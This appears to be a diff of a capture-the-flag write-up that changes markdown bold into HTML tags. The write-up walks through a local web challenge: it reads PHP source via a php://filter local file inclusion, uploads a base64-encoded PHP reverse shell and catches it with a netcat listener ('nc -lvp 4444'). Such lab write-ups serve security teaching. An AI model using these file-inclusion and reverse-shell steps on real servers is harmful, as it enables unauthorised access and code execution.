@@ -22,7 +22,7 @@ If we upload a file we get the message of the image.
 based on hint 2 we must somehow view the source code of the "validate_file.php" file in order to obtain the key-password.
 Atltough there is an LFI vulnerability we cannot see directly the content of a php file.
 However, we can read the base64 encoding of the file with the command
-**http://localhost/WebCTF/index.php?page=php://filter/convert.base64-encode/resource=validate_file.php**
+<b>http://localhost/WebCTF/index.php?page=php://filter/convert.base64-encode/resource=validate_file.php</b>
 
 ![fig5](read_php_file_base64.png)
 
@@ -35,7 +35,7 @@ This is not a problem! We can bypass these filters by encoding our php code to b
 We can use a php reverse shell payload (e.g pentestmonkey website). 
 in order to execute linux commands in the server. In that way we can achieve a reverse shell .
 
-Then from the attacker's machine we execute **nc -lvp 4444** and then in browser execute the command **../index.php?page=php://filter/convert.base64-decode/resource=show_m3_the_P@sS.2gd**
+Then from the attacker's machine we execute <b>nc -lvp 4444</b> and then in browser execute the command <b>../index.php?page=php://filter/convert.base64-decode/resource=show_m3_the_P@sS.2gd</b>
 
 ![fig7](php_reverse_shell.png)
 
